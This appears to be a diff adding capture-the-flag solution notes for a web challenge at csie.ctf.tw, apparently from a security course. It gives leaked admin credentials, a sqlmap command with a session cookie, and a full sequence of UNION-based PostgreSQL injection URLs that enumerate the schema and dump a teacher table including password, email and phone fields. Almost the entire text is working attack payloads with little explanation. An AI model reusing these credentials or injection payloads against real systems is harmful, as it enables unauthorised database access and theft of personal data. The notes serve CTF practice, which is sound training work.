@@ -1,0 +1,41 @@
+###PART1###
+***Try to login
+***Search for cei8a on github, and will find a repo of it
+Repo : https://github.com/cei8a/CEI8A
+Username : 'admin'
+Password : 'kaibrocl3gj94'
+
+###PART2###
+***Perform SQL injection
+***Try all possible php queries, only the one with vulnerability is given here
+
+#SQLinject with sqlmap:
+***Acquire cookie first
+
+python2 sqlmap.py -u "http://csie.ctf.tw:10137/teacher.php?op=s2&td=" --cookie="PHPSESSID=6mvvk5jjt690n9cmgjijee8pv1" --dump
+
+
+#SQLinject manually:
+
+***GET DATABASE
+http://csie.ctf.tw:10137/teacher.php?op=s2&td=%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CAST(CURRENT_SCHEMA()%20AS%20CHARACTER(100)),NULL--
+
+***GET TABLE COUNT
+http://csie.ctf.tw:10137/teacher.php?op=s2&td=%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CAST(COUNT(tablename)%20AS%20CHARACTER(100)),NULL%20FROM%20pg_tables%20WHERE%20schemaname%20IN%20((CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)))--
+
+***GET TABLE
+http://csie.ctf.tw:10137/teacher.php?op=s2&td=%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CAST(tablename%20AS%20CHARACTER(100)),NULL%20FROM%20pg_tables%20WHERE%20schemaname%20IN%20((CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)))--
+
+***GET COLUMN COUNT
+http://csie.ctf.tw:10137/teacher.php?op=s2&td=%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,COALESCE(CAST(COUNT(*)%20AS%20CHARACTER(100))),NULL%20FROM%20pg_namespace,pg_type,pg_attribute%20b%20JOIN%20pg_class%20a%20ON%20a.oid=b.attrelid%20WHERE%20a.relnamespace=pg_namespace.oid%20AND%20pg_type.oid=b.atttypid%20AND%20attnum%3E0%20AND%20a.relname=(CHR(116)||CHR(101)||CHR(97)||CHR(99)||CHR(104)||CHR(101)||CHR(114))%20AND%20nspname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99))--
+
+***GET COLUMNS NAME 1
+http://csie.ctf.tw:10137/teacher.php?op=s2&td=%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(SELECT%20CAST(attname%20AS%20CHARACTER(100))%20FROM%20pg_namespace,pg_type,pg_attribute%20b%20JOIN%20pg_class%20a%20ON%20a.oid=b.attrelid%20WHERE%20a.relnamespace=pg_namespace.oid%20AND%20pg_type.oid=b.atttypid%20AND%20attnum%3E0%20AND%20a.relname=(CHR(116)||CHR(101)||CHR(97)||CHR(99)||CHR(104)||CHR(101)||CHR(114))%20AND%20nspname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99))%20OFFSET%200%20LIMIT%201),NULL--
+
+***GET COLUMN NAME 2
+http://csie.ctf.tw:10137/teacher.php?op=s2&td=%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(SELECT%20CAST(attname%20AS%20CHARACTER(100))%20FROM%20pg_namespace,pg_type,pg_attribute%20b%20JOIN%20pg_class%20a%20ON%20a.oid=b.attrelid%20WHERE%20a.relnamespace=pg_namespace.oid%20AND%20pg_type.oid=b.atttypid%20AND%20attnum%3E0%20AND%20a.relname=(CHR(116)||CHR(101)||CHR(97)||CHR(99)||CHR(104)||CHR(101)||CHR(114))%20AND%20nspname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99))%20OFFSET%201%20LIMIT%201),NULL--
+
+…
+
+***GET ENTRY
+http://csie.ctf.tw:10137/teacher.php?op=s2&td=%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CAST(dept%20AS%20CHARACTER(100))||(CHR(32))||CAST(email%20AS%20CHARACTER(100))||(CHR(32))||CAST(id%20AS%20CHARACTER(100))||(CHR(32))||CAST(name%20AS%20CHARACTER(100))||(CHR(32))||CAST(nick%20AS%20CHARACTER(100))||(CHR(32))||CAST(office%20AS%20CHARACTER(100))||(CHR(32))||CAST(passwd%20AS%20CHARACTER(100))||(CHR(32))||CAST(phone%20AS%20CHARACTER(100))||(CHR(32))||CAST(pict%20AS%20CHARACTER(100))||(CHR(32))||CAST(ps%20AS%20CHARACTER(100))||(CHR(32))||CAST(url%20AS%20CHARACTER(100))||(CHR(32))||CAST(username%20AS%20CHARACTER(100))||(CHR(32)),NULL%20FROM%20public.teacher--
